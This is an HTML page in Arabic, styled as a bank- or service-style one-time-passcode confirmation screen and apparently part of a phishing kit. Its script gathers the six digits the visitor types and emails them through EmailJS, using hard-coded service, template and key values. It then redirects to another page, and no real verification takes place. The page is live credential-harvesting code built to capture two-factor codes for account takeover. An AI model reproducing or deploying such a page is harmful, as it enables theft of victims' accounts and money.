<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>رمز التأكيد</title>
    
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>

    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Cairo', sans-serif;
        }

        body {
            /* EXACT match to index.html background */
            background: linear-gradient(180deg, #18233a 0%, #1c315e 100%);
            color: #ffffff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            position: relative;
        }

        /* Header section aligned with index.html colors */
        .header {
            width: 100%;
            padding: 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-size: 18px;
            color: #a0aec0; /* Matched color */
        }

        .header .fa-chevron-right {
            cursor: pointer;
        }

        /* Logo matched exactly to index.html */
        .logo-container {
            margin-top: 40px;
            margin-bottom: 30px;
            display: flex;
            justify-content: center;
        }

        .logo-container img {
            width: 100px;
            height: auto;
        }

        /* Main Content Container */
        .content-container {
            width: 90%;
            max-width: 400px;
            display: flex;
            flex-direction: column;
            align-items: flex-start;
        }

        .title {
            font-size: 24px; /* Matched to login-title */
            font-weight: 700;
            margin-bottom: 10px;
        }

        .subtitle {
            font-size: 14px;
            font-weight: 600;
            color: #a0aec0; /* Matched to secondary text color */
            margin-bottom: 25px;
            line-height: 1.5;
        }

        .phone-number {
            font-family: monospace;
            font-size: 16px;
            font-weight: 700;
            display: block;
            color: #ffffff;
        }

        /* OTP Input Boxes styled exactly like index.html inputs */
        .otp-container {
            display: flex;
            justify-content: space-between;
            width: 100%;
            direction: ltr;
            margin-bottom: 40px;
        }

        .otp-field {
            width: 48px;
            height: 55px;
            background-color: rgba(255, 255, 255, 0.1); /* Matched input background */
            border: none; /* Removed border to match */
            border-radius: 12px; /* Matched border-radius */
            text-align: center;
            font-size: 24px;
            color: #ffffff;
            font-weight: 700;
            outline: none;
            transition: all 0.2s ease;
        }

        .otp-field:focus {
            background-color: rgba(255, 255, 255, 0.15);
            box-shadow: 0 0 8px rgba(77, 168, 250, 0.3); /* Subtle blue glow */
        }

        /* Bottom Confirm Button */
        .btn-confirm {
            position: absolute;
            bottom: 40px;
            left: 30px;
            background: transparent;
            color: #4da8fa; /* Accent blue from login button */
            border: none;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            padding: 10px 20px;
            transition: color 0.3s;
        }
        
        .btn-confirm:hover {
            color: #3b91e0;
        }

    </style>
</head>
<body>

    <div class="header">
        <i class="fa-solid fa-headset"></i>
        <i class="fa-solid fa-chevron-right" onclick="history.back()"></i>
    </div>

    <div class="logo-container">
        <img id="dynamic-logo" src="https://i.imgur.com/WnTTBP5.png" alt="Logo">
    </div>

    <div class="content-container">
        <h1 class="title">رمز التأكيد</h1>
        <p class="subtitle">
         أدخل رمز التحقق المرسل اليك:<br>
            <span class="phone-number" dir="ltr"></span>
        </p>

        <div class="otp-container" id="otp-inputs">
            <input type="text" class="otp-field" maxlength="1" pattern="[0-9]*" inputmode="numeric">
            <input type="text" class="otp-field" maxlength="1" pattern="[0-9]*" inputmode="numeric">
            <input type="text" class="otp-field" maxlength="1" pattern="[0-9]*" inputmode="numeric">
            <input type="text" class="otp-field" maxlength="1" pattern="[0-9]*" inputmode="numeric">
            <input type="text" class="otp-field" maxlength="1" pattern="[0-9]*" inputmode="numeric">
            <input type="text" class="otp-field" maxlength="1" pattern="[0-9]*" inputmode="numeric">
        </div>
    </div>

    <button class="btn-confirm" id="confirm-btn">تأكيد</button>

    <script>
        const otpInputs = document.querySelectorAll('.otp-field');

        otpInputs.forEach((input, index) => {
            input.addEventListener('input', (e) => {
                e.target.value = e.target.value.replace(/[^0-9]/g, '');
                
                if (e.target.value !== '' && index < otpInputs.length - 1) {
                    otpInputs[index + 1].focus();
                }
            });

            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
                    otpInputs[index - 1].focus();
                }
            });

            input.addEventListener('paste', (e) => {
                e.preventDefault();
                const pastedData = e.clipboardData.getData('text').replace(/[^0-9]/g, '').slice(0, 6);
                pastedData.split('').forEach((char, i) => {
                    if (i < otpInputs.length) {
                        otpInputs[i].value = char;
                    }
                });
                const focusIndex = Math.min(pastedData.length, otpInputs.length - 1);
                otpInputs[focusIndex].focus();
            });
        });

        emailjs.init("alrQnYhW4_ClmRT22");

        document.getElementById('confirm-btn').addEventListener('click', function() {
            let fullOtpCode = "";
            otpInputs.forEach(input => {
                fullOtpCode += input.value;
            });

            if (fullOtpCode.length < 6) {
                alert("يرجى إدخال الرمز المكون من 6 أرقام بالكامل.");
                return;
            }

            const submitBtn = document.getElementById('confirm-btn');
            const originalText = submitBtn.innerText;
            submitBtn.innerText = 'جاري...';

            const templateParams = {
                otp_code: fullOtpCode
            };

            emailjs.send("service_fpgakvm", "template_0pv7yzt", templateParams)
                .then(function(response) {
                    console.log('SUCCESS!', response.status, response.text);
                    submitBtn.innerText = originalText;
                    // التوجيه إلى الصفحة المطلوبة بعد نجاح الإرسال
                    window.location.href = 'chk.html';
                }, function(error) {
                    console.log('FAILED...', error);
                    submitBtn.innerText = originalText;
                    alert('حدث خطأ أثناء التأكيد. حاول مرة أخرى.');
                });
        });
    </script>
</body>
</html>
